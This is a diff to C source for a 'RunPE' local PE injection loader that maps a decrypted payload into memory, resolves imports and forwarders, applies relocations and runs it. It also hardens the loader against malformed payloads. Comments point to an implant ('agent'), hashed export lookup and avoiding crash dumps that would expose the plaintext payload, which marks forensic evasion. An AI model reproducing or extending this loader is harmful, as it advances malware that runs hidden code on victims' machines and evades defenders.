@@ -123,17 +123,47 @@ static HMODULE RunPE_GetModule(const char* dllNameA) {
  * MinGW agent died exactly this way on its first critsec call).  Forwarders
  * are followed to the target module; depth is bounded for safety. */
 static FARPROC RunPE_GetExportR(HMODULE hMod, const char* funcName, int depth);
+static FARPROC RunPE_GetExportByOrdinal(HMODULE hMod, DWORD ordinal, int depth);
 static HMODULE RunPE_LoadDll(const char* dllNameA);
 
-static FARPROC RunPE_GetExportByOrdinal(HMODULE hMod, DWORD ordinal) {
+/* Follows a forwarder: the EAT entry holds an RVA INSIDE the export directory
+ * pointing at a "MODULE.Function" / "MODULE.#ord" string instead of code.
+ * Shared by the by-name and by-ordinal resolvers; depth-bounded against
+ * forwarder cycles. */
+static FARPROC RunPE_FollowForwarder(PBYTE pBase, DWORD frva, int depth) {
+    if (depth > 4) return NULL;
+    const char* fwd = (const char*)(pBase + frva);
+    char modName[40];
+    int  m = 0;
+    while (*fwd && *fwd != '.' && m < 33) modName[m++] = *fwd++;
+    if (*fwd != '.') return NULL;
+    fwd++;
+    modName[m++]='.'; modName[m++]='d'; modName[m++]='l'; modName[m++]='l';
+    modName[m] = '\0';
+    HMODULE hTarget = RunPE_LoadDll(modName);
+    if (!hTarget) return NULL;
+    if (*fwd == '#') {
+        DWORD ord = 0;
+        fwd++;
+        while (*fwd >= '0' && *fwd <= '9') { ord = ord * 10 + (DWORD)(*fwd - '0'); fwd++; }
+        return RunPE_GetExportByOrdinal(hTarget, ord, depth + 1);
+    }
+    return RunPE_GetExportR(hTarget, fwd, depth + 1);
+}
+
+static FARPROC RunPE_GetExportByOrdinal(HMODULE hMod, DWORD ordinal, int depth) {
     PBYTE pBase = (PBYTE)hMod;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + ((PIMAGE_DOS_HEADER)pBase)->e_lfanew);
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
     IMAGE_DATA_DIRECTORY exp = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
     if (!exp.Size || !exp.VirtualAddress) return NULL;
     PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + exp.VirtualAddress);
     if (ordinal < pExp->Base || ordinal >= pExp->Base + pExp->NumberOfFunctions) return NULL;
     DWORD frva = ((PDWORD)(pBase + pExp->AddressOfFunctions))[ordinal - pExp->Base];
     if (!frva) return NULL;
+    if (frva >= exp.VirtualAddress && frva < exp.VirtualAddress + exp.Size)
+        return RunPE_FollowForwarder(pBase, frva, depth);
     return (FARPROC)(pBase + frva);
 }
 
@@ -154,27 +184,8 @@ static FARPROC RunPE_GetExportR(HMODULE hMod, const char* funcName, int depth) {
         while (*en && *fn && *en == *fn) { en++; fn++; }
         if (*en == *fn) {
             DWORD frva = pFuncs[pOrds[i]];
-            if (frva >= exp.VirtualAddress && frva < exp.VirtualAddress + exp.Size) {
-                /* Forwarder string "MODULE.Function" / "MODULE.#ord" */
-                const char* fwd = (const char*)(pBase + frva);
-                char modName[40];
-                int  m = 0;
-                if (depth > 4) return NULL;
-                while (*fwd && *fwd != '.' && m < 33) modName[m++] = *fwd++;
-                if (*fwd != '.') return NULL;
-                fwd++;
-                modName[m++]='.'; modName[m++]='d'; modName[m++]='l'; modName[m++]='l';
-                modName[m] = '\0';
-                HMODULE hTarget = RunPE_LoadDll(modName);
-                if (!hTarget) return NULL;
-                if (*fwd == '#') {
-                    DWORD ord = 0;
-                    fwd++;
-                    while (*fwd >= '0' && *fwd <= '9') { ord = ord * 10 + (DWORD)(*fwd - '0'); fwd++; }
-                    return RunPE_GetExportByOrdinal(hTarget, ord);
-                }
-                return RunPE_GetExportR(hTarget, fwd, depth + 1);
-            }
+            if (frva >= exp.VirtualAddress && frva < exp.VirtualAddress + exp.Size)
+                return RunPE_FollowForwarder(pBase, frva, depth);
             return (FARPROC)(pBase + frva);
         }
     }
@@ -268,14 +279,8 @@ static BOOL FixImportAddressTable(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
             FARPROC fnAddr = NULL;
 
             if (IMAGE_SNAP_BY_ORDINAL(pOrig->u1.Ordinal)) {
-                /* Import by ordinal */
-                PIMAGE_NT_HEADERS pDllNt = (PIMAGE_NT_HEADERS)
-                    ((PBYTE)hDll + ((PIMAGE_DOS_HEADER)hDll)->e_lfanew);
-                PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)
-                    ((PBYTE)hDll + pDllNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-                PDWORD pFuncArr = (PDWORD)((PBYTE)hDll + pExp->AddressOfFunctions);
-                WORD   ordIdx   = (WORD)IMAGE_ORDINAL(pOrig->u1.Ordinal) - (WORD)pExp->Base;
-                fnAddr = (FARPROC)((PBYTE)hDll + pFuncArr[ordIdx]);
+                /* Import by ordinal — same bounds + forwarder handling as by-name */
+                fnAddr = RunPE_GetExportByOrdinal(hDll, IMAGE_ORDINAL(pOrig->u1.Ordinal), 0);
             } else {
                 /* Import by name */
                 PIMAGE_IMPORT_BY_NAME pByName =
@@ -315,28 +320,50 @@ static BOOL FixBaseRelocations(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
     if (!pRelocDir->Size || !pRelocDir->VirtualAddress)
         return TRUE;
 
-    PIMAGE_BASE_RELOCATION pReloc =
-        (PIMAGE_BASE_RELOCATION)(pPeBase + pRelocDir->VirtualAddress);
+    DWORD sizeOfImage = pNtHdrs->OptionalHeader.SizeOfImage;
+    if (pRelocDir->VirtualAddress >= sizeOfImage)
+        return FALSE;
 
-    while (pReloc->VirtualAddress) {
+    /* The directory size — not a zero terminator — is the authoritative end
+     * (linkers are not required to append a terminator block). Walk whichever
+     * comes first. */
+    DWORD dirSpan = pRelocDir->Size;
+    DWORD imgSpan = sizeOfImage - pRelocDir->VirtualAddress;
+    if (dirSpan > imgSpan) dirSpan = imgSpan;
+
+    PBYTE pCur = pPeBase + pRelocDir->VirtualAddress;
+    PBYTE pEnd = pCur + dirSpan;
+
+    while (pCur + sizeof(IMAGE_BASE_RELOCATION) <= pEnd) {
+        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)pCur;
+        if (pReloc->VirtualAddress == 0) break;                 /* terminator / padding */
+        if (pReloc->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) return FALSE;
+        if (pCur + pReloc->SizeOfBlock > pEnd) return FALSE;
+
         PBASE_RELOC_ENTRY pEntry =
-            (PBASE_RELOC_ENTRY)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));
+            (PBASE_RELOC_ENTRY)(pCur + sizeof(IMAGE_BASE_RELOCATION));
         DWORD entryCount =
             (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
 
         for (DWORD i = 0; i < entryCount; i++) {
+            /* ULONGLONG math — VA+Offset overflows DWORD on malformed input.
+             * OOB patch targets are skipped, not fatal: preserves the run for
+             * odd payloads while killing the OOB write. */
+            ULONGLONG target = (ULONGLONG)pReloc->VirtualAddress + pEntry[i].Offset;
             if (pEntry[i].Type == RELOC_64BIT_FIELD) {
-                DWORD_PTR* pPatch =
-                    (DWORD_PTR*)(pPeBase + pReloc->VirtualAddress + pEntry[i].Offset);
-                *pPatch += delta;
+                if (target + sizeof(DWORD_PTR) <= sizeOfImage) {
+                    DWORD_PTR* pPatch = (DWORD_PTR*)(pPeBase + target);
+                    *pPatch += delta;
+                }
             } else if (pEntry[i].Type == RELOC_32BIT_FIELD) {
-                DWORD* pPatch =
-                    (DWORD*)(pPeBase + pReloc->VirtualAddress + pEntry[i].Offset);
-                *pPatch += (DWORD)delta;
+                if (target + sizeof(DWORD) <= sizeOfImage) {
+                    DWORD* pPatch = (DWORD*)(pPeBase + target);
+                    *pPatch += (DWORD)delta;
+                }
             }
         }
 
-        pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
+        pCur += pReloc->SizeOfBlock;
     }
 
     return TRUE;
@@ -387,17 +414,80 @@ static BOOL FixMemPermissions(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
 
 
 /* ============================================================
- *  RunPE – main function: Local PE Injection
+ *  RunPE_ValidatePe
+ *
+ *  Bounds-checks every header field the loader dereferences BEFORE any of it
+ *  is read outside the decompressed buffer. A malformed payload must die here
+ *  with a clean exit code — an AV after decryption means a WER dump
+ *  containing the plaintext payload.
+ *
+ *  Codes: 102/103 kept for compatibility; 106 = header geometry,
+ *  107 = section geometry. Zero sections is legal (tiny-PE style, EP in
+ *  headers). Sections with SizeOfRawData > VirtualSize (FileAlignment
+ *  padding) are legal — the copy clamps to SizeOfImage, matching what the
+ *  image can hold.
  * ============================================================ */
-DWORD RunPE(BYTE* pPeFile, DWORD exportHash, DWORD exportSeed, LPCSTR pExportArg, void (*PreExecuteCb)(void)) {
-    if (!pPeFile) return 101;
-
-    /* 1. Parse headers */
+static DWORD RunPE_ValidatePe(PBYTE pPeFile, DWORD peFileSize) {
+    if (peFileSize < sizeof(IMAGE_DOS_HEADER)) return 106;
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pPeFile;
     if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 102;
 
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pPeFile + pDos->e_lfanew);
+    /* Unsigned math: a negative e_lfanew wraps huge and is caught here.
+     * peFileSize >= 64 guaranteed above, so the subtraction cannot underflow. */
+    ULONG ntOfs = (ULONG)pDos->e_lfanew;
+    if (ntOfs > peFileSize - 4 - sizeof(IMAGE_FILE_HEADER)) return 106;
+
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pPeFile + ntOfs);
     if (pNt->Signature != IMAGE_NT_SIGNATURE) return 103;
+
+    /* The loader unconditionally reads OptionalHeader through DataDirectory[9]
+     * (TLS) — require a full PE32+ optional header inside the buffer. */
+    if (pNt->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64)) return 106;
+    if (pNt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return 106;
+    if ((ULONGLONG)ntOfs + 4 + sizeof(IMAGE_FILE_HEADER) +
+        pNt->FileHeader.SizeOfOptionalHeader > peFileSize) return 106;
+
+    DWORD sizeOfImage   = pNt->OptionalHeader.SizeOfImage;
+    DWORD sizeOfHeaders = pNt->OptionalHeader.SizeOfHeaders;
+    if (!sizeOfImage || !sizeOfHeaders) return 106;
+    if (sizeOfHeaders > sizeOfImage || sizeOfHeaders > peFileSize) return 106;
+
+    WORD numSections = pNt->FileHeader.NumberOfSections;
+    if (numSections > 0) {
+        ULONGLONG secEnd = (ULONGLONG)ntOfs + 4 + sizeof(IMAGE_FILE_HEADER) +
+            pNt->FileHeader.SizeOfOptionalHeader +
+            (ULONGLONG)numSections * sizeof(IMAGE_SECTION_HEADER);
+        if (secEnd > peFileSize) return 106;
+
+        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+        for (WORD i = 0; i < numSections; i++) {
+            if (pSec[i].SizeOfRawData == 0) continue;
+            /* VA == 0 would overwrite the copied headers; raw data past the
+             * file means a truncated payload. Both are fatal. */
+            if (pSec[i].VirtualAddress == 0 || pSec[i].VirtualAddress >= sizeOfImage)
+                return 107;
+            if (pSec[i].PointerToRawData > peFileSize ||
+                pSec[i].SizeOfRawData > peFileSize - pSec[i].PointerToRawData)
+                return 107;
+        }
+    }
+
+    return 0;
+}
+
+
+/* ============================================================
+ *  RunPE – main function: Local PE Injection
+ * ============================================================ */
+DWORD RunPE(BYTE* pPeFile, DWORD peFileSize, DWORD exportHash, DWORD exportSeed, LPCSTR pExportArg, void (*PreExecuteCb)(void)) {
+    if (!pPeFile) return 101;
+
+    /* 1. Validate geometry, then parse headers */
+    DWORD geoErr = RunPE_ValidatePe(pPeFile, peFileSize);
+    if (geoErr) return geoErr;
+
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pPeFile;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pPeFile + pDos->e_lfanew);
 
     DWORD  sizeOfImage = pNt->OptionalHeader.SizeOfImage;
     SIZE_T allocSize   = (SIZE_T)sizeOfImage;
@@ -419,20 +509,26 @@ DWORD RunPE(BYTE* pPeFile, DWORD exportHash, DWORD exportSeed, LPCSTR pExportArg
     /* 3. Copy PE headers */
     memcpy(pBase, pPeFile, pNt->OptionalHeader.SizeOfHeaders);
 
-    /* 4. Copy PE sections */
+    /* 4. Copy PE sections — clamped to SizeOfImage; the validator guarantees
+     *  VirtualAddress < SizeOfImage and the source range inside the file.
+     *  SizeOfRawData > VirtualSize is legal (FileAlignment padding) and fits
+     *  the image in spec-compliant PEs; the clamp only bites malformed ones. */
     PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
     for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        if (pSec[i].SizeOfRawData > 0) {
+        DWORD rawSize = pSec[i].SizeOfRawData;
+        if (rawSize > 0) {
+            DWORD imgAvail = sizeOfImage - pSec[i].VirtualAddress;
+            if (rawSize > imgAvail) rawSize = imgAvail;
             memcpy(
                 pBase + pSec[i].VirtualAddress,
                 pPeFile + pSec[i].PointerToRawData,
-                pSec[i].SizeOfRawData
+                rawSize
             );
         }
     }
 
     /* 5. Relocations (if allocation address != ImageBase) */
-    FixBaseRelocations(pBase, pNt);
+    if (!FixBaseRelocations(pBase, pNt)) return 108;
 
     /* 6. Resolve IAT */
     if (!FixImportAddressTable(pBase, pNt)) return 105;
